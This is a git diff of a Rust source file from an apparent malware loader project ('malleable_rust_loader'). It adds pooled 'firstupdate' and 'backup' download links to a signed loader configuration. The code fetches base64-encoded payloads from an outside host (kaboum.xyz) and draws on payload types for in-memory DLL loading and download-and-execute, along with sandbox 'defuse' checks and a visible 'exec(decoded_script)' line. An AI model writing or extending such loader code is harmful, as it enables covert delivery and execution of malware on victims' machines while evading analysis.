@@ -8,8 +8,10 @@ use malleable_rust_loader::defuse::Hostname;
 use malleable_rust_loader::defuse::Operator;
 use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
-use malleable_rust_loader::link::Link;
 use malleable_rust_loader::link::MemoryLink;
+use malleable_rust_loader::link::Link;
+use malleable_rust_loader::poollink::PoolLinks;
+use malleable_rust_loader::poollink::PoolMode;
 use malleable_rust_loader::config::Config;
 use malleable_rust_loader::payload::DllFromMemory;
 use malleable_rust_loader::payload::DownloadAndExec;
@@ -26,6 +28,8 @@ use argparse::{ArgumentParser, Store, StoreTrue};
 use log::info;
 use log::error;
 extern crate env_logger;
+
+use std::collections::BTreeMap;
 
 fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
     let pkcs8_bytes: Vec<u8> = fs::read(path_file).unwrap();
@@ -160,13 +164,9 @@ exec(decoded_script)
     panic!()
     }
 
-    // payload is define, now, CREATE the
-    info!("[+] LOAD ed25519 keypair from {:?}", keypair);
-    let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);
 
-    let loaderconf = Config::new_signed(
-        &key_pair_ed25519,
-        vec![
+    let solar_distance = BTreeMap::from([
+        ("firstupdate".to_string(), PoolLinks { pool_links:vec![
             Link::HTTP(HTTPLink {
                 url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
                 dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
@@ -180,6 +180,28 @@ exec(decoded_script)
                 sleep: 0,
             }),
         ],
+        pool_mode: PoolMode::MODE1
+    }),
+    ("backup".to_string(), PoolLinks { pool_links:vec![
+        Link::HTTP(HTTPLink {
+            url: String::from("https://kaboum.xyz/artdonjon/backup.html"),
+            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
+            jitt: 0,
+            sleep: 0,
+        }),
+    ],
+    pool_mode: PoolMode::MODE1
+}),
+
+    ]);
+
+    // payload is define, now, CREATE the
+    info!("[+] LOAD ed25519 keypair from {:?}", keypair);
+    let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);
+
+    let loaderconf = Config::new_signed(
+        &key_pair_ed25519,
+        solar_distance,
         payload_choice,
         vec![Defuse::CheckInternet(CheckInternet {
             list: vec![
